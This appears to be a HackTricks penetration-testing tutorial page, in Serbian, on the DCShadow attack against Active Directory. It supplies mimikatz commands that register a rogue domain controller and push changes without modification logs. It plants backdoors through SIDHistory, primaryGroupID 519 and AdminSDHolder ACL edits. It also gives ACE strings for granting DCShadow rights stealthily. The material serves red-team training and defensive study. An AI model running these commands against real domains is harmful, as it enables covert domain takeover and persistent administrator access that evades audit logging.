{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}


# DCShadow

Registruje **novi Kontroler Domena** u AD i koristi ga da **gura atribute** (SIDHistory, SPNs...) na specificiranim objektima **bez** ostavljanja bilo kakvih **logova** u vezi sa **modifikacijama**. **Potrebne su DA** privilegije i morate biti unutar **root domena**.\
Imajte na umu da ako koristite pogrešne podatke, pojaviće se prilično ružni logovi.

Da biste izvršili napad, potrebne su vam 2 instancije mimikatz. Jedna od njih će pokrenuti RPC servere sa SYSTEM privilegijama (ovde morate naznačiti promene koje želite da izvršite), a druga instanca će se koristiti za guranja vrednosti:

{% code title="mimikatz1 (RPC servers)" %}
```bash
!+
!processtoken
lsadump::dcshadow /object:username /attribute:Description /value="My new description"
```
{% endcode %}

{% code title="mimikatz2 (push) - Potrebna DA ili slično" %}
```bash
lsadump::dcshadow /push
```
{% endcode %}

Obratite pažnju da **`elevate::token`** neće raditi u `mimikatz1` sesiji jer je to podiglo privilegije niti, ali nam je potrebno da podignemo **privilegiju procesa**.\
Takođe možete odabrati i "LDAP" objekat: `/object:CN=Administrator,CN=Users,DC=JEFFLAB,DC=local`

Možete primeniti promene iz DA ili od korisnika sa ovim minimalnim dozvolama:

* U **objektu domena**:
* _DS-Install-Replica_ (Dodaj/Ukloni Repliku u Domen)
* _DS-Replication-Manage-Topology_ (Upravljanje Replikacionom Topologijom)
* _DS-Replication-Synchronize_ (Replikaciona Sinhronizacija)
* **Objekat Lokacija** (i njeni podobjekti) u **Konfiguracionom kontejneru**:
* _CreateChild and DeleteChild_
* Objekat **računara koji je registrovan kao DC**:
* _WriteProperty_ (Ne Write)
* **Ciljni objekat**:
* _WriteProperty_ (Ne Write)

Možete koristiti [**Set-DCShadowPermissions**](https://github.com/samratashok/nishang/blob/master/ActiveDirectory/Set-DCShadowPermissions.ps1) da dodelite ove privilegije korisniku bez privilegija (obratite pažnju da će ovo ostaviti neke logove). Ovo je mnogo restriktivnije od imanja DA privilegija.\
Na primer: `Set-DCShadowPermissions -FakeDC mcorp-student1 SAMAccountName root1user -Username student1 -Verbose`  To znači da korisničko ime _**student1**_ kada se prijavi na mašinu _**mcorp-student1**_ ima DCShadow dozvole nad objektom _**root1user**_.

## Korišćenje DCShadow za kreiranje zadnjih vrata

{% code title="Postavi Enterprise Admins u SIDHistory za korisnika" %}
```bash
lsadump::dcshadow /object:student1 /attribute:SIDHistory /value:S-1-521-280534878-1496970234-700767426-519
```
{% endcode %}

{% code title="Promena PrimaryGroupID (dodavanje korisnika kao člana Domain Administrators)" %}
```bash
lsadump::dcshadow /object:student1 /attribute:primaryGroupID /value:519
```
{% endcode %}

{% code title="Izmena ntSecurityDescriptor-a AdminSDHolder-a (dodeljivanje potpunih prava korisniku)" %}
```bash
#First, get the ACE of an admin already in the Security Descriptor of AdminSDHolder: SY, BA, DA or -519
(New-Object System.DirectoryServices.DirectoryEntry("LDAP://CN=Admin SDHolder,CN=System,DC=moneycorp,DC=local")).psbase.Objec tSecurity.sddl
#Second, add to the ACE permissions to your user and push it using DCShadow
lsadump::dcshadow /object:CN=AdminSDHolder,CN=System,DC=moneycorp,DC=local /attribute:ntSecurityDescriptor /value:<whole modified ACL>
```
{% endcode %}

## Shadowception - Dodelite DCShadow dozvole koristeći DCShadow (bez izmenjenih logova dozvola)

Moramo dodati sledeće ACE-ove sa SID-om našeg korisnika na kraju:

* Na objektu domena:
* `(OA;;CR;1131f6ac-9c07-11d1-f79f-00c04fc2dcd2;;UserSID)`
* `(OA;;CR;9923a32a-3607-11d2-b9be-0000f87a36b2;;UserSID)`
* `(OA;;CR;1131f6ab-9c07-11d1-f79f-00c04fc2dcd2;;UserSID)`
* Na objektu napadača: `(A;;WP;;;UserSID)`
* Na objektu ciljanog korisnika: `(A;;WP;;;UserSID)`
* Na objektu Lokacije u Konfiguracionom kontejneru: `(A;CI;CCDC;;;UserSID)`

Da biste dobili trenutni ACE objekta: `(New-Object System.DirectoryServices.DirectoryEntry("LDAP://DC=moneycorp,DC=loca l")).psbase.ObjectSecurity.sddl`

Primetite da u ovom slučaju treba da napravite **several changes,** ne samo jedan. Dakle, u **mimikatz1 sesiji** (RPC server) koristite parametar **`/stack` sa svakom izmenom** koju želite da napravite. Na ovaj način, biće vam potrebna samo **`/push`** jednom da izvršite sve zadržane promene na lažnom serveru.

[**Više informacija o DCShadow na ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1207-creating-rogue-domain-controllers-with-dcshadow)

{% hint style="success" %}
Učite i vežbajte AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Učite i vežbajte GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Podrška HackTricks</summary>

* Proverite [**planove pretplate**](https://github.com/sponsors/carlospolop)!
* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili **pratite** nas na **Twitteru** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podelite hakerske trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
{% endhint %}
